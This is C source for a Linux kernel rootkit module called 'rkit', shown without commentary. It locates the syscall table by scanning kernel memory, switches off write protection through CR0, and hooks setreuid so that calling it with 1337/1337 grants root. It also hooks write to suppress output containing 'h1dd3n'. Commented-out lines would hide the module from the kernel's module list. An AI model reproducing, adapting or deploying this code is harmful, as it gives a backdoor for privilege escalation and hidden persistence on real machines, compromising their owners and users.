#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

int rkit_init(void);
void rkit_exit(void);
module_init(rkit_init);
module_exit(rkit_exit);

#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef uint64_t psize;

asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
asmlinkage ssize_t (*o_setreuid)(uid_t ruid, uid_t euid);

psize *sys_call_table;
psize **find(void) {
    psize **sctable;
    psize i = START_CHECK;

    while (i < END_CHECK) {
        sctable = (psize **) i;
        if (sctable[__NR_close] == (psize *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}

asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid)
{
    ssize_t result;
    if (ruid == 1337 && euid == 1337)
    {
        struct cred *new = prepare_creds();
        new->uid = new->euid = make_kuid(current_user_ns(), 0);
        commit_creds(new);
	return EEXIST;
    }
    result = (*o_setreuid)(ruid, euid);
    return result;
}

asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
    int r;

    char *proc_protect = "h1dd3n";
    char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
    copy_from_user(kbuff, buff, 255);
    if (strstr(kbuff, proc_protect)) {
         kfree(kbuff);
         // struct cred *new = prepare_creds()
         // new->uid = new->euid = make_kuid(current_user_ns(), 0);
         // commit_creds(new);
         return EEXIST;
    }
    r = (*o_write)(fd, buff, count);
    kfree(kbuff);
    return r;
}

int rkit_init(void) {
    // list_del_init(&__this_module.list);
    // kobject_del(&THIS_MODULE->mkobj.kobj);

    if ((sys_call_table = (psize *) find())) {
        printk("rkit: sys_call_table is at: %p\n", sys_call_table);
    } else {
        printk("rkit: sys_call_table not found\n");
    }

    write_cr0(read_cr0() & (~ 0x10000));
    o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
    o_setreuid = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)rkit_setreuid);
    write_cr0(read_cr0() | 0x10000);

    return 0;
}





void rkit_exit(void) {
    write_cr0(read_cr0() & (~ 0x10000));
    xchg(&sys_call_table[__NR_write], (psize)o_write);
    xchg(&sys_call_table[__NR_setreuid], (psize)o_setreuid);
    write_cr0(read_cr0() | 0x10000);
    printk("rkit: Module unloaded\n");
}
